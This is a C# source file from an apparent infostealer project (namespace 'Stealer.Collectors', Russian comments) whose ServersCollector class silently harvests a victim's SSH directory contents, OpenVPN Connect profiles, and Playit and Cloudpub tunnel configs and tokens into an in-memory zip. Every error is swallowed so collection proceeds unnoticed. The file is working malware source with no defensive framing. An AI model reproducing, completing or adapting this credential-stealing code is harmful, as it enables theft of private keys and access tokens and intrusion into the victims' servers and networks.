using System;
using System.IO;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class ServersCollector
    {
        public static void Collect(InMemoryZip zip)
        {
            try
            {
                int collected = 0;

                collected += CollectSSH(zip);
                collected += CollectOpenVPN(zip);
                collected += CollectPlayit(zip);
                collected += CollectCloudpub(zip);

            }
            catch
            {
            }
        }

        private static int CollectSSH(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string sshPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh");
                if (!Directory.Exists(sshPath))
                    return 0;

                foreach (string file in Directory.GetFiles(sshPath))
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        
                        // Ограничение размера (100KB)
                        if (fileInfo.Length > 100 * 1024)
                            continue;

                        string targetPath = $"Servers/SSH/{Path.GetFileName(file)}";
                        zip.AddFile(targetPath, File.ReadAllBytes(file));
                        count++;
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectOpenVPN(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string openVpnPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");
                if (!Directory.Exists(openVpnPath))
                    return 0;

                foreach (string file in Directory.GetFiles(openVpnPath, "*.ovpn"))
                {
                    try
                    {
                        string targetPath = $"Servers/OpenVPN/{Path.GetFileName(file)}";
                        zip.AddFile(targetPath, File.ReadAllBytes(file));
                        count++;
                    }
                    catch { }
                }
            }
            catch { }

            return count;
        }

        private static int CollectPlayit(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                
                // Playit config locations
                string[] playitPaths = {
                    Path.Combine(userProfile, ".playit"),
                    Path.Combine(userProfile, ".config", "playit"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "playit")
                };

                foreach (string playitPath in playitPaths)
                {
                    if (!Directory.Exists(playitPath))
                        continue;

                    foreach (string file in Directory.GetFiles(playitPath, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            string ext = fileInfo.Extension.ToLower();

                            // Собираем конфиги и токены
                            if (ext == ".toml" || ext == ".json" || ext == ".yaml" || ext == ".yml" || ext == ".conf" || ext == "")
                            {
                                if (fileInfo.Length > 1 * 1024 * 1024) // 1MB limit
                                    continue;

                                string targetPath = $"Servers/Playit/{Path.GetFileName(file)}";
                                zip.AddFile(targetPath, File.ReadAllBytes(file));
                                count++;
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }

        private static int CollectCloudpub(InMemoryZip zip)
        {
            int count = 0;
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                
                // Cloudpub config locations
                string[] cloudpubPaths = {
                    Path.Combine(userProfile, ".cloudpub"),
                    Path.Combine(userProfile, ".config", "cloudpub"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "cloudpub")
                };

                foreach (string cloudpubPath in cloudpubPaths)
                {
                    if (!Directory.Exists(cloudpubPath))
                        continue;

                    foreach (string file in Directory.GetFiles(cloudpubPath, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            string ext = fileInfo.Extension.ToLower();

                            // Собираем конфиги и токены
                            if (ext == ".toml" || ext == ".json" || ext == ".yaml" || ext == ".yml" || ext == ".conf" || ext == "")
                            {
                                if (fileInfo.Length > 1 * 1024 * 1024) // 1MB limit
                                    continue;

                                string targetPath = $"Servers/Cloudpub/{Path.GetFileName(file)}";
                                zip.AddFile(targetPath, File.ReadAllBytes(file));
                                count++;
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return count;
        }
    }
}
